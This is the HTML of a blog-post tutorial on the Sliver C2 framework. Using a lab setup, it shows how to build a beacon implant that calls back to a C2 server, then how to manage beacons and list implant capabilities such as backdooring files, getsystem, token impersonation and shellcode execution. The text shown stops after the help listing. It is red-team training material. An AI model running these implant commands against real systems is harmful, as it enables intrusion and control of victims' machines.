@@ -1,0 +1,1054 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.101.0" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learning Sliver C2 (08) - Implant Basics | text/plain</title>
+    <meta name="description" content="An overview of elementary Sliver implant capabilities.
+Shows how to interact with processes, the file system, network connections and the Windows Registry.
+">
+    <meta name="keywords" content="c2, sliver, tutorial, implant, commands, registry">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Learning Sliver C2 (08) - Implant Basics" />
+<meta property="og:description" content="An overview of elementary Sliver implant capabilities.
+Shows how to interact with processes, the file system, network connections and the Windows Registry.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/learning_sliver_c2_08_implant_basics/" /><meta property="og:image" content="https://dominicbreuker.com/img/avatar.png"/><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-10-24T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-24T00:00:00+00:00" />
+
+
+    
+
+
+
+  <meta property="og:image" content="img/avatar.png">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/learning_sliver_c2_08_implant_basics/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+</style>
+
+    
+    
+      <script async src="/js/lazysizes.min.js"></script>
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    <meta itemprop="name" content="Learning Sliver C2 (08) - Implant Basics">
+<meta itemprop="description" content="An overview of elementary Sliver implant capabilities.
+Shows how to interact with processes, the file system, network connections and the Windows Registry.
+"><meta itemprop="datePublished" content="2022-10-24T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-10-24T00:00:00+00:00" />
+<meta itemprop="wordCount" content="4156"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
+<meta itemprop="keywords" content="c2,sliver,tutorial,implant,commands,registry," />
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Learning Sliver C2 (08) - Implant Basics</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>20 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2022-10-24T00:00:00&#43;00:00">24 Oct, 2022</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">An overview of elementary Sliver implant capabilities.
+Shows how to interact with processes, the file system, network connections and the Windows Registry.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#preparations">Preparations</a></li>
+    <li><a href="#beacon-and-session-management">Beacon and session management</a></li>
+    <li><a href="#processes">Processes</a></li>
+    <li><a href="#files">Files</a></li>
+    <li><a href="#network">Network</a></li>
+    <li><a href="#windows-registry">Windows Registry</a></li>
+  </ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      <h1 id="sliver-c2">Sliver C2</h1>
+<p>This post is part of a tutorial blog post series on Sliver C2 (v1.5.16).
+For an overview: <a href="../../post/learning_sliver_c2_01_installation/">click here</a>.</p>
+<h2 id="introduction">Introduction</h2>
+<p>If you went through the previous posts, you should be familiar with the C2 protocols
+and be able to write a basic stager for Sliver implants that runs even if AV is on.
+Time to look at what you can do with a working C2 connection to a target,
+which is what this and the next posts will be about.</p>
+<p>In this post, I&rsquo;ll first recap the most important commands for implant management.
+After that, I&rsquo;ll go through basic implant capabilities you can leverage to interact with OS resources.
+Sliver implants provide native functionality to gather information about your security context,
+processes, files, network connections as well as the Windows registry.
+Some things can just be read, others can also be modified
+(e.g., you can upload files).
+This post covers only simple commands akin to those available in a command shell.
+More sophisticated features will be discussed in-depth in dedicated posts.</p>
+<p>To the bests of my knowledge, all capabilities shown here are implemented natively in Go
+as part of the implant.
+No additional code will be loaded code from the C2 server.</p>
+<p>My discussion below will mostly focus on beacon implants.
+You can always launch a session from a beacon using the <code>interactive</code> command.
+Thus, my current impression is that you will mostly see people use beacons and switch to sessions only if necessary
+to avoid long-running network connections to the C2 server.
+Some functionality requires sessions though, which I&rsquo;ll mention if it is the case.</p>
+<p>Before diving in, the next section outlines the lab setup I&rsquo;ve used to create the post.
+Follow the links for details or skip if you don&rsquo;t need that.
+I&rsquo;ll also describe basic commands to manage beacons and sessions.
+While there is some overlap with previous posts, it will make this post more self-contained.</p>
+<h2 id="preparations">Preparations</h2>
+<p>I have a lab environment with the following hosts:</p>
+<ul>
+<li>a target running Windows which we want to infect (192.168.122.32)</li>
+<li>a Sliver C2 server generating implant shellcode and running stage listeners (192.168.122.111 / sliver.labnet.local)</li>
+<li>a proxy server running Squid and a DNS service to resolve domain names in the lab (192.168.122.185)</li>
+</ul>
+<p>Posts
+<a href="../../post/learning_sliver_c2_01_installation/">1</a> to
+<a href="../../post/learning_sliver_c2_05_transports_in_detail_dns/">5</a>
+show how I created it, but details don&rsquo;t matter too much here.</p>
+<p>All you need to follow along the rest of the post is a Windows target running a Sliver beacon implant
+which connects to your C2 server.
+I assume you are able to do that.
+If not, read <a href="../../post/learning_sliver_c2_06_stagers_process_injection">post 6</a>
+and get a stager running.</p>
+<p>To prepare, connect to your Sliver console and set up a stage listener.
+You can create your implant profile with <code>profiles new beacon --http sliver.labnet.local?driver=wininet --seconds 5 --jitter 0 --skip-symbols --format shellcode --arch amd64 win64http</code>
+(unless you already have one), then start the listener:</p>
+<pre tabindex="0"><code>sliver &gt; stage-listener --url http://sliver.labnet.local:80 --profile win64http
+
+[*] No builds found for profile win64http, generating a new one
+[*] Job 1 (http) started
+
+sliver &gt;  jobs
+
+ ID   Name   Protocol   Port 
+==== ====== ========== ======
+ 1    http   tcp        80
+</code></pre><p>Then run a stager or get the implant running in any other way.
+My stager injects into <code>msedge.exe</code>, the Edge browser.</p>
+<h2 id="beacon-and-session-management">Beacon and session management</h2>
+<p>When you are connected to the Sliver console, you can list all beacons
+with the <code>beacons</code> command. If your stager worked, it should look like this:</p>
+<pre tabindex="0"><code>sliver &gt; beacons 
+
+ ID         Name            Transport   Username   Operating System   Last Check-In   Next Check-In 
+========== =============== =========== ========== ================== =============== ===============
+ e736ce4f   WISE_LIGHTING   http(s)     tester     windows/amd64      3s ago          2s
+</code></pre><p>Use the <code>use</code> command (with the beacon ID as an argument, tab-completion supported)
+to select the beacon. The prompt will change such that it shows the beacon&rsquo;s name
+within it:</p>
+<pre tabindex="0"><code>sliver &gt; use e736ce4f-df49-4204-b011-bced2a926c36
+
+[*] Active beacon WISE_LIGHTING (e736ce4f-df49-4204-b011-bced2a926c36)
+
+sliver (WISE_LIGHTING) &gt;
+</code></pre><p>If you have lots of beacons you may loose the overview.
+Give them names to keep tabs on them. This can be done with the <code>rename</code> command.
+My test beacon was called <code>WISE_LIGHTING</code>,
+but with <code>rename -n myprecious</code> I renamed it to <code>myprecious</code>.
+For some reason, the beacon is backgrounded when you do that,
+so you&rsquo;ll have to select it again:</p>
+<pre tabindex="0"><code>sliver (WISE_LIGHTING) &gt; rename -n myprecious
+
+[*] Renamed implant to myprecious
+
+sliver &gt; use e736ce4f-df49-4204-b011-bced2a926c36
+
+[*] Active beacon myprecious (e736ce4f-df49-4204-b011-bced2a926c36)
+
+sliver (myprecious) &gt;
+</code></pre><p>To get some basic context information on your currently selected beacon, use the <code>info</code> command.
+Among other things, it shows the user which runs your beacon process,
+the hostname, operating system and architecture as well as the active C2 configuration.
+A complete output of the command looks like this:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; info
+
+         Beacon ID: e736ce4f-df49-4204-b011-bced2a926c36
+              Name: myprecious
+          Hostname: DESKTOP-2CNJ1IR
+              UUID: b6b566b3-95de-44f3-98d8-cc71a9e04829
+          Username: DESKTOP-2CNJ1IR\tester
+               UID: S-1-5-21-352893395-444706649-1566723291-1001
+               GID: S-1-5-21-352893395-444706649-1566723291-513
+               PID: 7544
+                OS: windows
+           Version: 10 build 19044 x86_64
+              Arch: amd64
+         Active C2: https://sliver.labnet.local?driver=wininet
+    Remote Address: 192.168.122.32:49832
+         Proxy URL: 
+          Interval: 5s
+            Jitter: 0s
+</code></pre><p>The best thing about <code>info</code> is that it does not require a round-trip to the C2 server.
+Implants report this data by default and it is cached on the C2 server.
+Some of the information provided by <code>info</code> can also be gathered separately.
+Run:</p>
+<ul>
+<li><code>whoami</code>: to get the username</li>
+<li><code>getuid</code>: to get the UID</li>
+<li><code>getgid</code>: to get the GID</li>
+<li><code>getpid</code>: to get the PID</li>
+</ul>
+<p>We could see the implant&rsquo;s C2 configuration above, but there is a way to change it too.
+The command is called <code>reconfig</code>.
+For example, use it to change the beaconing interval or jitter.
+This is how to make a beacon check in every 30 seconds:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; reconfig -i 30s -j 0s
+
+[*] Tasked beacon myprecious (d7201fc1)
+
+[+] myprecious completed task d7201fc1
+
+[*] Reconfigured beacon
+</code></pre><p>Note that at the time of writing, there seems to be a bug in the <code>info</code> command.
+The interval reconfiguration was not reflected in the configuration shown by <code>info</code>,
+which kept showing me the old settings.
+However, you can confirm the change in another way.
+The list of beacons you can see with the <code>beacons</code> command shows you how long it is until each beacon next checks in.
+Your change will be properly reflected in there.</p>
+<p>This shall be enough about beacon management.
+To get an overview of all commands it supports, use the <code>help</code> command
+while being connected to the beacon (or session) you want to use.
+This command always shows the complete list of commands, not all of which are related
+to the beacon. Look out for the command categories <code>Sliver - Windows</code> and <code>Sliver</code>,
+which are the platform-specific and cross-platform commands you can use.
+My help looked like this:</p>
+<pre tabindex="0"><code>sliver (myprecious) &gt; help
+
+...
+
+Sliver - Windows:
+=================
+  backdoor          Infect a remote file with a sliver shellcode
+  dllhijack         Plant a DLL for a hijack scenario
+  execute-assembly  Loads and executes a .NET assembly in a child process (Windows Only)
+  getprivs          Get current privileges (Windows only)
+  getsystem         Spawns a new sliver session as the NT AUTHORITY\SYSTEM user (Windows Only)
+  impersonate       Impersonate a logged in user.
+  make-token        Create a new Logon Session with the specified credentials
+  migrate           Migrate into a remote process
+  psexec            Start a sliver service on a remote target
+  registry          Windows registry operations
+  rev2self          Revert to self: lose stolen Windows token
+  runas             Run a new process in the context of the designated user (Windows Only)
+  spawndll          Load and execute a Reflective DLL in a remote process
+
+
+Sliver:
+=======
+  cat                Dump file to stdout
+  cd                 Change directory
+  close              Close an interactive session without killing the remote process
+  download           Download a file
+  execute            Execute a program on the remote system
+  execute-shellcode  Executes the given shellcode in the sliver process
+  extensions         Manage extensions
+  getgid             Get session process GID
+  getpid             Get session pid
+  getuid             Get session process UID
+  ifconfig           View network interface configurations
+  info               Get info about session
+  interactive        Task a beacon to open an interactive session (Beacon only)
+  kill               Kill a session
+  ls                 List current directory
+  mkdir              Make a directory
+  msf                Execute an MSF payload in the current process
+  msf-inject         Inject an MSF payload into a process
+  mv                 Move or rename a file
+  netstat            Print network connection information
+  ping               Send round trip message to implant (does not use ICMP)
+  pivots             List pivots for active session
+  portfwd            In-band TCP port forwarding
+  procdump           Dump process memory
+  ps                 List remote processes
+  pwd                Print working directory
+  reconfig           Reconfigure the active beacon/session
+  rename             Rename the active beacon/session
+  rm                 Remove a file or directory
+  screenshot         Take a screenshot
+  shell              Start an interactive shell
+  sideload           Load and execute a shared object (shared library/DLL) in a remote process
+  socks5             In-band SOCKS5 Proxy
+  ssh                Run a SSH command on a remote host
+  terminate          Terminate a process on the remote system
+  upload             Upload a file
+  whoami             Get session user execution context
+
+
+For even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki
